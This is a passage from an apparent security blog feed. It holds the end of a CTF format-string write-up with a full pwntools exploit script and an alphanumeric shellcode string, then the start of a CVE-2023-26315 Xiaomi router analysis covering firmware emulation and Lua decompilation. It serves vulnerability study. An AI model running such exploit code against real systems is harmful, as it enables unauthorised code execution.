class="number">0</span>, bss, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5次的非栈上printf，是极限情况，改 <code>_libc_start_main+240</code>为<code>one_gadget</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="number">3</span></span><br><span class="line">p=run()</span><br><span class="line"><span class="comment"># 1 泄露libc和stack</span></span><br><span class="line"><span class="comment"># 2 分两次覆盖ret为one_gadget</span></span><br><span class="line">og=[<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,<span class="string">b&#x27;%9$p-%11$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">ogg=libc_base+og[<span class="number">2</span>]</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,ogg)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0xE0</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(stack_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&quot;%&quot;</span> +<span class="built_in">str</span>(ogg &amp; <span class="number">0xffff</span>).encode() +<span class="string">b&#x27;c%37$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>((stack_addr+<span class="number">2</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&quot;%&quot;</span> +<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xff</span>).encode() +<span class="string">b&#x27;c%37$hhn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;%hhn（写入一字节）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%hn（写入两字节）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%n（32位写四字节）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%ln &amp;#x2F;</summary>
      
    
    
    
    <category term="printf" scheme="http://s1nec-1o.github.io/categories/printf/"/>
    
    <category term="pwn" scheme="http://s1nec-1o.github.io/categories/printf/pwn/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-26315</title>
    <link href="http://s1nec-1o.github.io/2024/07/12/CVE-2023-26315/"/>
    <id>http://s1nec-1o.github.io/2024/07/12/CVE-2023-26315/</id>
    <published>2024-07-12T08:55:37.000Z</published>
    <updated>2024-07-12T08:57:58.814Z</updated>
    
    <content type="html"><![CDATA[<p>这个cve是我至今以来复现的最为复杂的漏洞了，winmt真神！</p><h2 id="固件仿真"><a href="#固件仿真" class="headerlink" title="固件仿真"></a>固件仿真</h2><p>首先固件的提取可以看<a href="https://zikh26.github.io/posts/3d9490d.html">zikh26</a>的博客，非常详细</p><p>如果是直接下载固件包的话，要先运行<code>sudo apt install libvirt-daemon-system libvirt-clients virt-manager</code>下载virbr0网桥</p><blockquote><p>但是我在下载的时候要求卸载掉vmtool，可能是软件关系的冲突，但是zikh26师傅说他没遇到过，因此我猜测是网卡分配的冲突或者是网络配置的冲突？？我也不是很懂，如果有了解的师傅请跟我说说，不过卸载了也没关系，不过是手改elf文件罢了</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-M virt \</span><br><span class="line">-cpu cortex-a53 \</span><br><span class="line">-m 1G \</span><br><span class="line">-initrd initrd.img-5.10.0-29-arm64 \</span><br><span class="line">    -kernel vmlinuz-5.10.0-29-arm64 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/vda2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -drive <span class="keyword">if</span>=virtio,file=debian=3607-aarch64.qcow2,format=qcow2,<span class="built_in">id</span>=hd</span><br><span class="line">-netdev tap,<span class="built_in">id</span>=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-pci,netdev=net0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>可以先自己配置看看如果不会的话看<a href="https://bbs.kanxue.com/thread-282034.htm">winmt</a>也是十分详细，tql</p><h2 id="lua文件分析"><a href="#lua文件分析" class="headerlink" title="lua文件分析"></a>lua文件分析</h2><p>由于小米路由器在较新的版本采用了魔改版的lua编译器，因此得使用特定的lua反编译软件，而这点已经有网上的师傅做出来了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-11-jdk</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/NyaMisty/unluac_miwifi.git</span><br><span class="line"><span class="built_in">cd</span> unluac_miwifi</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line">javac -d build -sourcepath src  src/unluac/*.java</span><br><span class="line">jar -cfm build/unluac.jar src/META-INF/MANIFEST.MF -C build</span><br></pre></td></tr></table></figure><p>之后运行脚本来批量反编译*.lua</p><p>这里使用winmt师傅写的批量脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">res = os.popen(<span class="string">&quot;find ./ -name *.lua&quot;</span>).readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(res)) :</span><br><span class="line">    path = res[i].strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;java -jar /home/winmt/unluac_miwifi/build/unluac.jar &quot;</span> + path + <span class="string">&quot; &gt; &quot;</span> + path + <span class="string">&quot;.dis&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure><p>之后便可以开始分析lua文件了</p><p>首先看<code>/usr/lib/lua/luci/controller/api/xqdatacenter.lua</code>，整个文件时配置一个API控制器模块</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6</span><br><span class="line">  L0 = node</span><br><span class="line">  L1 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L2 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L0 = L0(L1, L2)         <span class="comment">---node /api/xqdatacenter</span></span><br><span class="line">  L1 = firstchild         </span><br><span class="line">  L1 = L1()               </span><br><span class="line">  L0.target = L1          <span class="comment">---set target as first branch point</span></span><br><span class="line">  L0.title = <span class="string">&quot;&quot;</span></span><br><span class="line">  L0.order = <span class="number">300</span></span><br><span class="line">  L0.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L0.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span>             <span class="comment">---verification method</span></span><br><span class="line">  L0.index = <span class="literal">true</span></span><br><span class="line">  L1 = entry                                  <span class="comment">---default entry</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L3 = firstchild</span><br><span class="line">  L3 = L3()</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">300</span></span><br><span class="line">  L1(L2, L3, L4, L5)     <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;&#125; , firstchild() , _&quot;&quot; , 300 )</span></span><br><span class="line">  L1 = entry                                   <span class="comment">--request processing</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;request&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;tunnelRequest&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">301</span></span><br><span class="line">  L1(L2, L3, L4, L5)    <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;,&quot;request&quot;&#125; , call(tunnelRequest) , _&quot;&quot; , 301 )</span></span><br><span class="line">  L1 = entry            <span class="comment">---identify device</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;identify_device&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;identifyDevice&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">302</span></span><br><span class="line">  L6 = <span class="number">8</span></span><br><span class="line">  L1(L2, L3, L4, L5, L6)</span><br><span class="line">  L1 = entry                <span class="comment">--download</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;download&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;download&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">303</span></span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                <span class="comment">--upload</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;upload&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;upload&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">304</span></span><br><span class="line">  L6 = <span class="number">16</span></span><br><span class="line">  L1(L2, L3, L4, L5, L6)</span><br><span class="line">  L1 = entry                    <span class="comment">----thumbnail</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry               <span class="comment">--device_id</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry               <span class="comment">--check file exit?</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                    <span class="comment">--ssh</span></span><br><span class="line">  ...</span><br><span class="line">  L1 = entry                       <span class="comment">---ssh status</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                    <span class="comment">--file system probe</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                 <span class="comment">--file system resume</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>第一个函数L0是定义了一些类似上传，下载之类的api入口，每个入口点都有特定的处理函数</p><p>开头</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">L0 = node</span><br><span class="line">  L1 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L2 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L0 = L0(L1, L2)         <span class="comment">---node /api/xqdatacenter</span></span><br><span class="line">  L1 = firstchild         </span><br><span class="line">  L1 = L1()               </span><br><span class="line">  L0.target = L1          <span class="comment">---set target as first branch point</span></span><br><span class="line">  L0.title = <span class="string">&quot;&quot;</span></span><br><span class="line">  L0.order = <span class="number">300</span></span><br><span class="line">  L0.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L0.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span>             <span class="comment">---verification method</span></span><br><span class="line">  L0.index = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>首先配置一个节点&#x2F;api&#x2F;xqdatacenter，firstchild设定了默认的入口方式，sysauth和sysauth_authenticator设置了认证方式，即在访问&#x2F;api&#x2F;xqdatacenter这个节点的时候是需要鉴权的，即通过<code>/usr/lib/lua/luci/dispatcher.lua</code>的aythenticator.jsonauth函数鉴权，由于这是学习的过程，因此尽量每个地方都弄懂</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">L10 = authenticator</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L11</span><span class="params">(A0, A1, A2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L3, L4, L5, L6, L7, L8, L9, L10, L11, L12, L13, L14</span><br><span class="line">  L3 = <span class="built_in">require</span></span><br><span class="line">  L4 = <span class="string">&quot;xiaoqiang.util.XQSysUtil&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = luci</span><br><span class="line">  L4 = L4.http</span><br><span class="line">  L4 = L4.xqformvalue</span><br><span class="line">  L5 = <span class="string">&quot;username&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = luci</span><br><span class="line">  L5 = L5.http</span><br><span class="line">  L5 = L5.xqformvalue</span><br><span class="line">  L6 = <span class="string">&quot;password&quot;</span></span><br><span class="line">  L5 = L5(L6)</span><br><span class="line">  L6 = luci</span><br><span class="line">  L6 = L6.http</span><br><span class="line">  L6 = L6.xqformvalue</span><br><span class="line">  L7 = <span class="string">&quot;nonce&quot;</span></span><br><span class="line">  L6 = L6(L7)</span><br><span class="line">  <span class="keyword">if</span> L6 <span class="keyword">then</span></span><br><span class="line">    L7 = _UPVALUE0_</span><br><span class="line">    L7 = L7.checkNonce</span><br><span class="line">    L8 = L6</span><br><span class="line">    L9 = getremotemac</span><br><span class="line">    L9, L10, L11, L12, L13, L14 = L9()</span><br><span class="line">    L7 = L7(L8, L9, L10, L11, L12, L13, L14)</span><br><span class="line">    <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">      L7 = _UPVALUE0_</span><br><span class="line">      L7 = L7.checkUser</span><br><span class="line">      L8 = L4</span><br><span class="line">      L9 = L6</span><br><span class="line">      L10 = L5</span><br><span class="line">      L7 = L7(L8, L9, L10)</span><br><span class="line">      <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">        L7 = empower</span><br><span class="line">        L8 = <span class="string">&quot;1&quot;</span></span><br><span class="line">        L9 = <span class="string">&quot;1&quot;</span></span><br><span class="line">        L10 = <span class="literal">nil</span></span><br><span class="line">        L7(L8, L9, L10)</span><br><span class="line">        L7 = <span class="string">&quot;2&quot;</span></span><br><span class="line">        L8 = luci</span><br><span class="line">        L8 = L8.http</span><br><span class="line">        L8 = L8.header</span><br><span class="line">        L9 = <span class="string">&quot;Set-Cookie&quot;</span></span><br><span class="line">        L10 = <span class="string">&quot;psp=&quot;</span></span><br><span class="line">        L11 = L4</span><br><span class="line">        L12 = <span class="string">&quot;|||&quot;</span></span><br><span class="line">        L13 = L7</span><br><span class="line">        L14 = <span class="string">&quot;|||0;path=/;&quot;</span></span><br><span class="line">        L10 = L10 .. L11 .. L12 .. L13 .. L14</span><br><span class="line">        L8(L9, L10)</span><br><span class="line">        L8 = L4</span><br><span class="line">        L9 = L7</span><br><span class="line">        <span class="keyword">return</span> L8, L9</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        L7 = loginAuthenFailed</span><br><span class="line">        L7()</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      L7 = context</span><br><span class="line">      L8 = &#123;&#125;</span><br><span class="line">      L7.<span class="built_in">path</span> = L8</span><br><span class="line">      L7 = luci</span><br><span class="line">      L7 = L7.http</span><br><span class="line">      L7 = L7.<span class="built_in">write</span></span><br><span class="line">      L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:1582,\&quot;msg\&quot;:\&quot;Invalid nonce\&quot;&#125;&quot;</span></span><br><span class="line">      L7(L8)</span><br><span class="line">      L7 = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">return</span> L7</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    L7 = _UPVALUE0_</span><br><span class="line">    L7 = L7.checkPlaintextPwd</span><br><span class="line">    L8 = L4</span><br><span class="line">    L9 = L5</span><br><span class="line">    L7 = L7(L8, L9)</span><br><span class="line">    <span 